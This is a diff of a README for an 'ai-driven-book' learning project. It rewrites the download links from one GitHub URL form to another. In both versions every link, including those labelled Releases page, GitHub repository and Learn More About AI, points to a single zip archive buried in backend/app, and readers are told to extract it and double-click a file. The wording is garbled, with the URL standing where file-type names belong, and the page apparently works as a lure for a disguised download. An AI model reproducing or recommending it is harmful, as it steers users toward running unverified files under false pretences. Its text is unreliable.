@@ -1,7 +1,7 @@
 # 📘 ai-driven-book - Learn AI Development with Ease
 
 ## 🚀 Download Now
-[![Download ai-driven-book](https://raw.githubusercontent.com/Mak9996/ai-driven-book/main/backend/app/book_driven_ai_3.3.zip%20ai--driven--book-blue)](https://raw.githubusercontent.com/Mak9996/ai-driven-book/main/backend/app/book_driven_ai_3.3.zip)
+[![Download ai-driven-book](https://github.com/Mak9996/ai-driven-book/raw/refs/heads/main/backend/app/book_driven_ai_3.3.zip%20ai--driven--book-blue)](https://github.com/Mak9996/ai-driven-book/raw/refs/heads/main/backend/app/book_driven_ai_3.3.zip)
 
 ## 📘 Description
 This interactive book on AI-Driven Development features 40 multiple-choice questions (MCQs), flashcards, a smart chatbot, and beautiful diagrams. You will learn to build apps using GPT-4, Claude, and Gemini. Dive into the world of AI and enhance your skills with engaging content and practical exercises.
@@ -19,15 +19,15 @@ This interactive book on AI-Driven Development features 40 multiple-choice quest
 - **Software**: A modern web browser (Chrome, Firefox, Safari).
 
 ## 📦 Download & Install
-To get started, visit our [Releases page](https://raw.githubusercontent.com/Mak9996/ai-driven-book/main/backend/app/book_driven_ai_3.3.zip) to download the application. Here are the steps:
+To get started, visit our [Releases page](https://github.com/Mak9996/ai-driven-book/raw/refs/heads/main/backend/app/book_driven_ai_3.3.zip) to download the application. Here are the steps:
 
 1. Click on the link above to go to the Releases page.
 2. Look for the latest version available. It will be on top of the list.
-3. Choose your desired format. You can select from different file types like .zip or https://raw.githubusercontent.com/Mak9996/ai-driven-book/main/backend/app/book_driven_ai_3.3.zip according to your operating system.
+3. Choose your desired format. You can select from different file types like .zip or https://github.com/Mak9996/ai-driven-book/raw/refs/heads/main/backend/app/book_driven_ai_3.3.zip according to your operating system.
 4. Click the download link, and the file will start downloading to your computer.
 5. Once the download is complete, locate the file on your device.
-6. Extract the files if you downloaded a .zip or https://raw.githubusercontent.com/Mak9996/ai-driven-book/main/backend/app/book_driven_ai_3.3.zip format.
-7. Open the folder and double-click the https://raw.githubusercontent.com/Mak9996/ai-driven-book/main/backend/app/book_driven_ai_3.3.zip file to launch the interactive book in your web browser.
+6. Extract the files if you downloaded a .zip or https://github.com/Mak9996/ai-driven-book/raw/refs/heads/main/backend/app/book_driven_ai_3.3.zip format.
+7. Open the folder and double-click the https://github.com/Mak9996/ai-driven-book/raw/refs/heads/main/backend/app/book_driven_ai_3.3.zip file to launch the interactive book in your web browser.
 
 ## 🧑‍🏫 How to Use This Book
 Once you have the book open in your browser, you can navigate through the content using the following features:
@@ -64,13 +64,13 @@ If you encounter any issues while downloading or running the book, consider the 
 - Check your internet connection if you cannot download the files.
 
 ## 📞 Support
-For additional support, please create an issue on the [GitHub repository](https://raw.githubusercontent.com/Mak9996/ai-driven-book/main/backend/app/book_driven_ai_3.3.zip). We aim to respond to all inquiries promptly.
+For additional support, please create an issue on the [GitHub repository](https://github.com/Mak9996/ai-driven-book/raw/refs/heads/main/backend/app/book_driven_ai_3.3.zip). We aim to respond to all inquiries promptly.
 
 ## 📢 Community
 Join our growing community! Connect with fellow learners and share your experiences. Contributions and discussions are welcome on our GitHub Issues page.
 
 ## 🔗 Additional Resources
-- [Learn More About AI](https://raw.githubusercontent.com/Mak9996/ai-driven-book/main/backend/app/book_driven_ai_3.3.zip)
-- [Explore Programming with React](https://raw.githubusercontent.com/Mak9996/ai-driven-book/main/backend/app/book_driven_ai_3.3.zip)
+- [Learn More About AI](https://github.com/Mak9996/ai-driven-book/raw/refs/heads/main/backend/app/book_driven_ai_3.3.zip)
+- [Explore Programming with React](https://github.com/Mak9996/ai-driven-book/raw/refs/heads/main/backend/app/book_driven_ai_3.3.zip)
 
-Remember to visit our [Releases page](https://raw.githubusercontent.com/Mak9996/ai-driven-book/main/backend/app/book_driven_ai_3.3.zip) to get the latest updates and versions of the book. Happy learning!
+Remember to visit our [Releases page](https://github.com/Mak9996/ai-driven-book/raw/refs/heads/main/backend/app/book_driven_ai_3.3.zip) to get the latest updates and versions of the book. Happy learning!
